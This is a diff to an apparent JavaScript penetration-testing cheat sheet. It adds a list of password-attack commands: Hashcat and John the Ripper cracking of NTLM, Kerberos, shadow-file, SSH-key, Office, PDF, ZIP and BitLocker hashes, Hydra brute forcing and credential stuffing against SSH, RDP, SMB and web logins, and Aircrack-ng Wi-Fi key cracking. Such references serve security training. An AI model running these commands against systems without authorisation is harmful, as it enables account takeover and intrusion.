@@ -3122,7 +3122,349 @@ const WORDLISTS = [
         command: 'wget https://www.routerpasswords.com',
         note: 'Router default creds'
     }
-]
+];
+
+const PASSWORD_CRACKING = [
+    // ===== HASHCAT =====
+    {
+        tool: 'Hashcat',
+        useCase: 'NTLM dictionary attack',
+        command: 'hashcat -m 1000 -a 0 hashes.txt wordlist.txt'
+    },
+    {
+        tool: 'Hashcat',
+        useCase: 'NTLM dictionary attack (rockyou)',
+        command: 'hashcat -m 1000 dumpedhashes.txt /usr/share/wordlists/rockyou.txt'
+    },
+    {
+        tool: 'Hashcat',
+        useCase: 'NTLM with rules',
+        command: 'hashcat -m 1000 -a 0 hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule'
+    },
+    {
+        tool: 'Hashcat',
+        useCase: 'Rule-based wordlist generation',
+        command: 'hashcat --force password.list -r custom.rule --stdout > mut_password.list'
+    },
+    {
+        tool: 'Hashcat',
+        useCase: 'NetNTLMv2 dictionary attack',
+        command: 'hashcat -m 5600 -a 0 netntlmv2.txt wordlist.txt'
+    },
+    {
+        tool: 'Hashcat',
+        useCase: 'Kerberoast RC4 (etype 23)',
+        command: 'hashcat -m 13100 -a 0 kerberoast.txt wordlist.txt'
+    },
+    {
+        tool: 'Hashcat',
+        useCase: 'AS-REP roast RC4 (etype 23)',
+        command: 'hashcat -m 18200 -a 0 asrep.txt wordlist.txt'
+    },
+    {
+        tool: 'Hashcat',
+        useCase: 'DCC2/MSCache v2 dictionary attack',
+        command: 'hashcat -m 2100 -a 0 mscache2.txt wordlist.txt'
+    },
+    {
+        tool: 'Hashcat',
+        useCase: 'LM dictionary attack',
+        command: 'hashcat -m 3000 -a 0 lm.txt wordlist.txt'
+    },
+    {
+        tool: 'Hashcat',
+        useCase: 'Mask brute force',
+        command: 'hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a?a?a'
+    },
+    {
+        tool: 'Hashcat',
+        useCase: 'Hybrid wordlist + mask',
+        command: 'hashcat -m 1000 -a 6 hashes.txt wordlist.txt ?d?d'
+    },
+    {
+        tool: 'Hashcat',
+        useCase: 'Hybrid mask + wordlist',
+        command: 'hashcat -m 1000 -a 7 hashes.txt ?d?d wordlist.txt'
+    },
+    {
+        tool: 'Hashcat',
+        useCase: 'Show cracked passwords',
+        command: 'hashcat --show -m 1000 hashes.txt'
+    },
+    {
+        tool: 'Hashcat',
+        useCase: 'Show cracked result for a single hash',
+        command: 'hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt --show'
+    },
+    {
+        tool: 'Hashcat',
+        useCase: 'Resume a session',
+        command: 'hashcat --restore --session ntlm_session'
+    },
+    {
+        tool: 'Hashcat',
+        useCase: 'Benchmark local hardware',
+        command: 'hashcat -b'
+    },
+    {
+        tool: 'Hashcat',
+        useCase: 'Hashes with username prefix',
+        command: 'hashcat -m 1000 -a 0 hashes.txt wordlist.txt --username'
+    },
+    {
+        tool: 'Hashcat',
+        useCase: 'Write cracked output',
+        command: 'hashcat -m 1000 -a 0 hashes.txt wordlist.txt --outfile cracked.txt --outfile-format 2'
+    },
+    {
+        tool: 'Hashcat',
+        useCase: 'Show status periodically',
+        command: 'hashcat -m 1000 -a 0 hashes.txt wordlist.txt --status --status-timer=10'
+    },
+    {
+        tool: 'Hashcat',
+        useCase: 'SHA512crypt from unshadowed hashes',
+        command: 'hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked'
+    },
+    {
+        tool: 'Hashcat',
+        useCase: 'MD5 dictionary attack',
+        command: 'hashcat -m 500 -a 0 md5-hashes.list rockyou.txt'
+    },
+    {
+        tool: 'Hashcat',
+        useCase: 'BitLocker hash cracking',
+        command: 'hashcat -m 22100 backup.hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt -o backup.cracked'
+    },
+    // ===== JOHN THE RIPPER =====
+    {
+        tool: 'John the Ripper',
+        useCase: 'NTLM dictionary attack',
+        command: 'john --format=nt --wordlist=wordlist.txt hashes.txt'
+    },
+    {
+        tool: 'John the Ripper',
+        useCase: 'NTLM with rules',
+        command: 'john --format=nt --wordlist=wordlist.txt --rules hashes.txt'
+    },
+    {
+        tool: 'John the Ripper',
+        useCase: 'NetNTLMv2 dictionary attack',
+        command: 'john --format=netntlmv2 --wordlist=wordlist.txt netntlmv2.txt'
+    },
+    {
+        tool: 'John the Ripper',
+        useCase: 'Kerberoast RC4 (etype 23)',
+        command: 'john --format=krb5tgs --wordlist=wordlist.txt kerberoast.txt'
+    },
+    {
+        tool: 'John the Ripper',
+        useCase: 'AS-REP roast RC4 (etype 23)',
+        command: 'john --format=krb5asrep --wordlist=wordlist.txt asrep.txt'
+    },
+    {
+        tool: 'John the Ripper',
+        useCase: 'DCC2/MSCache v2 dictionary attack',
+        command: 'john --format=mscash2 --wordlist=wordlist.txt mscache2.txt'
+    },
+    {
+        tool: 'John the Ripper',
+        useCase: 'LM dictionary attack',
+        command: 'john --format=lm --wordlist=wordlist.txt lm.txt'
+    },
+    {
+        tool: 'John the Ripper',
+        useCase: 'Incremental brute force',
+        command: 'john --format=nt --incremental hashes.txt'
+    },
+    {
+        tool: 'John the Ripper',
+        useCase: 'Mask attack',
+        command: "john --format=nt --mask='?a?a?a?a?a?a?a?a' hashes.txt"
+    },
+    {
+        tool: 'John the Ripper',
+        useCase: 'Single crack mode',
+        command: 'john --format=nt --single hashes.txt'
+    },
+    {
+        tool: 'John the Ripper',
+        useCase: 'Show cracked passwords',
+        command: 'john --show --format=nt hashes.txt'
+    },
+    {
+        tool: 'John the Ripper',
+        useCase: 'Resume last session',
+        command: 'john --restore'
+    },
+    {
+        tool: 'John the Ripper',
+        useCase: 'Parallel cracking',
+        command: 'john --format=nt --wordlist=wordlist.txt --fork=4 hashes.txt'
+    },
+    {
+        tool: 'John the Ripper',
+        useCase: 'Save a named session',
+        command: 'john --session=ntlm_session --format=nt --wordlist=wordlist.txt hashes.txt'
+    },
+    {
+        tool: 'John the Ripper',
+        useCase: 'Combine passwd and shadow',
+        command: 'unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes'
+    },
+    {
+        tool: 'John the Ripper',
+        useCase: 'Extract SSH key hash',
+        command: 'python3 ssh2john.py SSH.private > ssh.hash'
+    },
+    {
+        tool: 'John the Ripper',
+        useCase: 'Crack SSH key hash',
+        command: 'john ssh.hash --show'
+    },
+    {
+        tool: 'John the Ripper',
+        useCase: 'Extract Office document hash',
+        command: 'office2john.py Protected.docx > protected-docx.hash'
+    },
+    {
+        tool: 'John the Ripper',
+        useCase: 'Crack Office document hash',
+        command: 'john --wordlist=rockyou.txt protected-docx.hash'
+    },
+    {
+        tool: 'John the Ripper',
+        useCase: 'Extract PDF hash',
+        command: 'pdf2john.pl PDF.pdf > pdf.hash'
+    },
+    {
+        tool: 'John the Ripper',
+        useCase: 'Crack PDF hash',
+        command: 'john --wordlist=rockyou.txt pdf.hash'
+    },
+    {
+        tool: 'John the Ripper',
+        useCase: 'Extract ZIP hash',
+        command: 'zip2john ZIP.zip > zip.hash'
+    },
+    {
+        tool: 'John the Ripper',
+        useCase: 'Crack ZIP hash',
+        command: 'john --wordlist=rockyou.txt zip.hash'
+    },
+    {
+        tool: 'John the Ripper',
+        useCase: 'Extract BitLocker hash',
+        command: 'bitlocker2john -i Backup.vhd > backup.hashes'
+    },
+    // ===== HYDRA =====
+    {
+        tool: 'Hydra',
+        useCase: 'Generic service (user list)',
+        command: 'hydra -L user.list -P password.list <service>://<ip>'
+    },
+    {
+        tool: 'Hydra',
+        useCase: 'Generic service (single user)',
+        command: 'hydra -l username -P password.list <service>://<ip>'
+    },
+    {
+        tool: 'Hydra',
+        useCase: 'Generic service (single password)',
+        command: 'hydra -L user.list -p password <service>://<ip>'
+    },
+    {
+        tool: 'Hydra',
+        useCase: 'Credential stuffing (SSH)',
+        command: 'hydra -C <user_pass.list> ssh://<IP>'
+    },
+    {
+        tool: 'Hydra',
+        useCase: 'SSH user list',
+        command: 'hydra -L users.txt -P passwords.txt ssh://<TARGET_IP>'
+    },
+    {
+        tool: 'Hydra',
+        useCase: 'SSH single user',
+        command: 'hydra -l <USER> -P passwords.txt ssh://<TARGET_IP>'
+    },
+    {
+        tool: 'Hydra',
+        useCase: 'RDP user list',
+        command: 'hydra -L users.txt -P passwords.txt rdp://<TARGET_IP>'
+    },
+    {
+        tool: 'Hydra',
+        useCase: 'SMB user list',
+        command: 'hydra -L users.txt -P passwords.txt smb://<TARGET_IP>'
+    },
+    {
+        tool: 'Hydra',
+        useCase: 'FTP user list',
+        command: 'hydra -L users.txt -P passwords.txt ftp://<TARGET_IP>'
+    },
+    {
+        tool: 'Hydra',
+        useCase: 'HTTP basic auth',
+        command: 'hydra -L users.txt -P passwords.txt http-get://<TARGET_IP>'
+    },
+    {
+        tool: 'Hydra',
+        useCase: 'HTTP POST form',
+        command: 'hydra -L users.txt -P passwords.txt <TARGET_IP> http-post-form "/login.php:username=^USER^&password=^PASS^:F=Invalid"'
+    },
+    {
+        tool: 'Hydra',
+        useCase: 'MySQL user list',
+        command: 'hydra -L users.txt -P passwords.txt mysql://<TARGET_IP>'
+    },
+    {
+        tool: 'Hydra',
+        useCase: 'VNC single password list',
+        command: 'hydra -P passwords.txt vnc://<TARGET_IP> -V'
+    },
+    {
+        tool: 'Hydra',
+        useCase: 'Custom port',
+        command: 'hydra -L users.txt -P passwords.txt ssh://<TARGET_IP> -s 2222'
+    },
+    {
+        tool: 'Hydra',
+        useCase: 'Stop on first hit',
+        command: 'hydra -l <USER> -P passwords.txt ssh://<TARGET_IP> -f'
+    },
+    {
+        tool: 'Hydra',
+        useCase: 'Throttle and threads',
+        command: 'hydra -L users.txt -P passwords.txt ssh://<TARGET_IP> -t 4 -W 3'
+    },
+    // ===== AIRCRACK-NG =====
+    {
+        tool: 'Aircrack-ng',
+        useCase: 'WPA/WPA2 dictionary attack',
+        command: 'aircrack-ng -w wordlist.txt capture.cap'
+    },
+    {
+        tool: 'Aircrack-ng',
+        useCase: 'WPA with BSSID filter',
+        command: 'aircrack-ng -w wordlist.txt -b <BSSID> capture.cap'
+    },
+    {
+        tool: 'Aircrack-ng',
+        useCase: 'WPA with ESSID filter',
+        command: 'aircrack-ng -w wordlist.txt -e <ESSID> capture.cap'
+    },
+    {
+        tool: 'Aircrack-ng',
+        useCase: 'Write cracked key to file',
+        command: 'aircrack-ng -w wordlist.txt -l cracked.txt capture.cap'
+    },
+    {
+        tool: 'Aircrack-ng',
+        useCase: 'WEP cracking',
+        command: 'aircrack-ng -a 1 -b <BSSID> capture.cap'
+    }
+];
 
 const TRANSFER_PROTOCOLS = [{
         name: 'HTTP',
